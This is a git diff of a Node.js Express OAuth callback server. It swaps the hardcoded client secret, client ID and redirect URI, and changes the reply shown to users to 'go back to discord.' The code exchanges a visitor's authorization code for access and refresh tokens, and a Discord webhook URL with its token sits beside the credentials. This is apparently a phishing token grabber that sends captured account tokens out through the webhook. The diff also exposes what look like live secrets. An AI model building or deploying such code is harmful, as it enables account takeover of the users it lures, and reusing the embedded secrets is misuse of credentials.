@@ -1,7 +1,7 @@
 //Config
-const secret_value = 'm908Q~uwgNhIScBeqDzKMi3ACPKws57-9fsK-bxD'
-const client_id = 'ef5bb6a5-ccbf-41b6-9bda-f509e4d8503b'
-const redirect_uri = 'https://dull-teal-bull-yoke.cyclic.app'
+const client_secret = 'fa58f5f4-c358-4605-ab93-bd351a6f9c3c'
+const client_id = 'a74dcdc0-94c3-4a21-8a82-b60500053c44'
+const redirect_uri = 'https://tiny-pear-gorilla-robe.cyclic.app'
 const webhook_url = 'https://discord.com/api/webhooks/1116046426120671364/S2vkJtF_PuEWaGFEteEFf9CQ1iHoM2Y_0tsSKPdzZiXyf0c3JvP9M7cTgsEjoYhxvDYo'
 //Requirements
 const axios = require('axios')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('go back to discord.')
     const code = req.query.code
     if (code == null) {
         return
@@ -49,7 +49,7 @@ async function getAccessTokenAndRefreshToken(code) {
     let data = {
         client_id: client_id,
         redirect_uri: redirect_uri,
-        secret_value: secret_value,
+        client_secret: client_secret,
         code: code,
         grant_type: 'authorization_code'
     }
